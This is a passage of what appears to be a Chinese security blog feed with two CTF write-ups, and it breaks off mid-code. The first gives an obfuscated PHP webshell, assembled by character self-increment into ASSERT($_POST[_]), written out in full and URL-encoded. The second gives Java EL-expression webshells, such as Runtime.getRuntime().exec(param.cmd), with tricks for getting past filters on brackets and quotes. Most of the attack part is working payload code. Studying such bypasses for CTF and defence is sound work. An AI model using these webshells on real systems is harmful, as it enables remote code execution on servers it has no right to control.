class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// T</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]); <span class="hljs-comment">// ASSERT($_POST[_]);</span><br></code></pre></td></tr></table></figure><p>连接起来就是</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xquery">shell=<span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;$_&quot;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>];<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-number">0</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=$<span class="hljs-variable">$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[<span class="hljs-number">_</span>]);<br><br>//urlencode<br>shell=<span class="hljs-meta">%24_</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%5B</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%40</span><span class="hljs-meta">%22</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%5B</span><span class="hljs-string">&#x27;!&#x27;</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%3D</span><span class="hljs-string">&#x27;%40&#x27;</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span><span class="hljs-meta">%3D</span><span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24</span><span class="hljs-meta">%24____</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>(<span class="hljs-meta">%24_</span><span class="hljs-meta">%5B_</span><span class="hljs-meta">%5D</span>)<span class="hljs-meta">%3B</span><br></code></pre></td></tr></table></figure><p>但是这种方式得到的payload过长，万一有长度限制就无法bypass；另外assert函数在php5中可以作为动态函数名来执行代码，类似于</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$a=<span class="hljs-string">&#x27;assert&#x27;</span><span class="hljs-comment">;</span><br>$b=<span class="hljs-string">&#x27;phpinfo();&#x27;</span><span class="hljs-comment">;</span><br>$a($b)<br></code></pre></td></tr></table></figure><p>但在php7中，assert不再作为函数使用，而是变成了语言结构(类似eval)，所以这种自增payload在php7也会失效。但我们依然可以采用上面提到的取反的方式进行函数动态调用。</p><h3 id="8-linux内置变量"><a href="#8-linux内置变量" class="headerlink" title="8.linux内置变量"></a>8.linux内置变量</h3><p>使用环境内置变量我们可以获取需要的字符。</p><p>首先介绍几个linux内置变量</p><blockquote><p>$PATH环境变量，可执行文件的搜索路径</p><p>$PWD当前所在目录，比如在ctf环境中是&#x2F;var&#x2F;www&#x2F;html</p><p>$</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>新型EL webshell初探</title>
    <link href="/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/"/>
    <url>/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="从DesperateCat到EL-webshell初探"><a href="#从DesperateCat到EL-webshell初探" class="headerlink" title="从DesperateCat到EL webshell初探"></a>从DesperateCat到EL webshell初探</h1><h2 id="0x00-RWCTF引发的思考"><a href="#0x00-RWCTF引发的思考" class="headerlink" title="0x00 RWCTF引发的思考"></a>0x00 RWCTF引发的思考</h2><pre><code class="hljs">前段时间结束的Realworld ctf里有一道题目**DesperateCat**，这道题目考察的是严苛环境下写webshell的问题，对于写入文件内容的限制其中有一点：</code></pre><ul><li><p><strong>禁止传入圆括号、尖括号、引号等</strong>。</p><p>  如果我们单独处理bypass，那么其实很好解决：</p></li></ul><ol><li>尖括号 &lt;% %&gt;：使用EL表达式</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//&lt;%Runtime.getRuntime.exec(request.getParameter(&quot;cmd&quot;));%&gt;</span><br><span class="hljs-comment">//替换成为</span><br>$&#123;Runtime.getRuntime().exec(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p>这样就避免出现了尖括号。</p><p>2.圆括号 () : java 代码编译解析器会识别 Unicode 形式的编码，所可以直接unicode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 